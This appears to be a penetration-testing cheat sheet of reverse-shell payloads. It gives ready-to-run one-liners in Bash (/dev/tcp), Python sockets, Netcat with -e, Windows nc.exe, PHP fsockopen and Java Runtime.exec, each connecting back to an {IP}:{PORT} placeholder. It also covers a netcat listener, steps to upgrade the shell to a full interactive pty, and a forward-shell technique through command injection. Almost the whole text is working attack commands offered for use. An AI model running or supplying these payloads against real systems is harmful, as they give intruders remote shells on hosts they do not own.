Reverse-Shell
=============

A list of Reverse Shells on multiple languages. Replace `{IP}` and `{PORT}` values
with a couple `IP:port` the server can access. Then, on your local machine you open
a listener with `netcat`:

## On local machine

### Listen with NetCat

To listen for an incoming connection and upgrade to a pty shell:

```bash
nc -lvnp {PORT}

# after the connection is established
python -c 'import pty; pty.spawn("/bin/bash")'
```

> On macOS use the `netcat` from [homebrew](https://formulae.brew.sh/formula/netcat)
> instead of the one provided by the OS


### Upgrade the shell

Then, `Ctrl-Z` to suspend the connection and return to your own terminal.
Type on your terminal:

```bash
stty raw -echo
```

The console should be black, next foreground the shell with:

```bash
fg
reset
```

On target host:

```bash
export SHELL=bash
export TERM=xterm-256color
stty rows 24 columns 80
```

Now you should have a complete shell with shortcuts available.


## On the remote server

### Windows

Upload [`nc.exe`](https://eternallybored.org/misc/netcat/) on the remote server
then use the command (same as [NetCat](#netcat)):

```bash
cmd.exe /C "nc.exe {IP} {PORT} -e cmd.exe"
```


### PowerShell

This is explain in the [Windows / Download and execute script section](windows.md#download-and-execute-script).


### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Bash
```bash
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
```

> To use the bash's built-in `/dev/tcp` device file the use must use `/bin/bash`
> as shell. Often it uses `sh` or `dash`, then you can use `bash -c "<cmd>"` to
> force the `bash`


### Netcat
```bash
nc -e /bin/sh {IP} {PORT}
```

### Java
```java
r = Runtime.getRuntime();p = r.exec(["your payload"] as String[]);p.waitFor()
String[] cmd={"cmd","/C","<cmd>"};Runtime.getRuntime().exec(cmd);
```

> This payload can also work with `BeanShell` scripts.


### PHP
```bash
php -r '\$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'
```


## Forward shell

If the remote server cannot contact your local machine, it's still possible to
use a shell that accept commands from named pipes using `mkfifo` and send the
output to a file.

IppSec has a repository on Github with a simple but effective script to demonstrate
the technique on a vulnerable web server: [`forward-shell`](https://github.com/IppSec/forward-shell).
You need to set the vulnerable url (`self.url = r"http://'...`) and the exploit
arguments (`headers = {'User-Agent': payload}`). Remember that you can use the same
technique on other services that allow you to inject commands.
